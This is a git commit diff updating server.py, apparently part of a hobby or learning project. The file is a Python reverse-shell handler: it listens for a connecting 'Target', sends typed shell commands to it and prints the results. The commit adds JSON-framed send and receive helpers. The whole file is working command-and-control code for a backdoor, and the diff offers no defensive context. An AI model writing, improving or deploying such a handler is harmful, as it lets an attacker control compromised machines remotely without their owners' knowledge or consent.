41cac303a8c4ccaaa609a4c91464929120daef7c
skilfoy <20802814+skilfoy@users.noreply.github.com>
2021-07-10 04:11:39 -0500

    Update server.py

--- server.py
+++ server.py
@@ -1,24 +1,43 @@
 #!/usr/bin/python
 import socket
+import json
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+def server():
+    global s
+    global ip
+    global target
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    s.bind(("127.0.0.1",54321))
+    s.listen(5)
+    print("Listening for incoming connections...")
+    target, ip = s.accept()
+    print("Target Connected!")
 
-s.bind(("127.0.0.1",54321))
-
-s.listen(5)
-print("Listening for incoming connections...")
-
-target, ip = s.accept()
-print("Target Connected!")
-
-while True:
-    command = raw_input("* Shell~#%s: " % str(ip))
-    target.send(command)
-    if command == "q":
-        break
-    else:
-        result = target.recv(1024)
-        print(result)
-
+def shell():
+    while True:
+        command = raw_input("* Shell~#%s: " % str(ip))
+        reliable_send(command)
+        if command == "q":
+            break
+        else:
+            result = reliable_recv()
+            print(result)
+            
+def reliable_send(data):
+    json_data = json.dumps(data)
+    target.send(json_data)
+    
+def reliable_recv():
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + target.recv(1024)
+            return json.loads(json_data)
+        except ValueError:
+            continue
+    
+    
+server()
+shell()
 s.close()
